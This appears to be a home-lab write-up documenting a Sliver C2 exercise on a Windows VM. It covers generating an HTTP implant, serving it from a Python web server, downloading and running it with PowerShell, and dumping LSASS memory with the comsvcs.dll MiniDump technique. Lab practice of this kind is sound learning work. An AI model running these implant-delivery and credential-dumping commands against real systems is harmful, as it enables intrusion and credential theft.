# 🧪 Sliver Implant & Credential Dump

This section walks through deploying a Sliver implant on a Windows VM and dumping LSASS credentials. Screenshots are provided for visual reference.

---

## 💉 Implant Generation & Delivery

- Generated an HTTP implant payload using Sliver:
  ```bash
  generate --http 192.168.x.x --save /opt/sliver
  ```


- Hosted the payload using a temporary Python HTTP server:
  ```bash
  cd /opt/sliver
  python3 -m http.server 80
  ```

- Downloaded the implant onto the Windows VM:
  ```powershell
  IWR -Uri http://192.168.x.x/NEW_SHAKEDOWN.exe -Outfile C:\Users\localadmin\Downloads\NEW_SHAKEDOWM.exe
  ```

[Implant on Windows VM](screenshot/Implant%20on%20Windows%20Vm.png)

---

## 📡 Listener Setup & Implant Execution

- Started an HTTP listener in Sliver:
  ```bash
  http
  ```

[Run Sliver](screenshot/Run%20Sliver.png)

- Executed the implant manually on the Windows VM:
  ```powershell
  .\New_SHAKEDOWN.exe
  ```

[Sliver Implant Execution](screenshot/Sliver%20implant.png)

- Verified the callback and checked active sessions:
  ```bash
  sessions
  ```

[Sliver Session](screenshot/Sliver%20Session.png)

- Interacted with the session:
  ```bash
  use <session_id>
  ```
[Get System](screenshot/Get%20System%20sliver.png)

[Verify Established Implant Connection](screenshots/Verify%20Established%20Implant%20Connection.png)

---

## 🧠 LSASS Credential Dump

- Attempted to dump LSASS memory using:
  ```bash
  execute rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [PID] C:\\Windows\\Temp\\lsass.dmp full
  ```

